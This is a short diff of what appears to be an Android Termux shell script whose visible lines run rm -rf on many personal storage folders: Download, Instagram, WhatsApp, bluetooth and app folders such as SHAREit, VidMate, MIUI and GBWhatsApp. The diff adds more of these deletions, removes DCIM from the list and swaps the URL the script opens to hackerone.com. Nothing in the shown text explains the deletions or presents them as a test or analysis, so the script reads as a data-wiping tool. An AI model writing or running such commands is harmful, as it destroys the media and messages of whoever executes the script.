@@ -25,10 +25,15 @@ rm -rf BGMI
 rm -rf ApkEditor
 rm -rf Download
 rm -rf Instagram
-rm -rf DCIM
+rm -rf SHAREit
 rm -rf bluetooth
 rm -rf WhatsApp
+rm -rf VidMate
+rm -rf Instagram
+rm -rf YoWhatsApp
+rm -rf MIUI
+rm -rf GBWhatsApp
 cd $HOME
-termux-open  jairajputana.com
+termux-open  hackerone.com
 cd $HOME
 rm -rf CrashWhatsApp
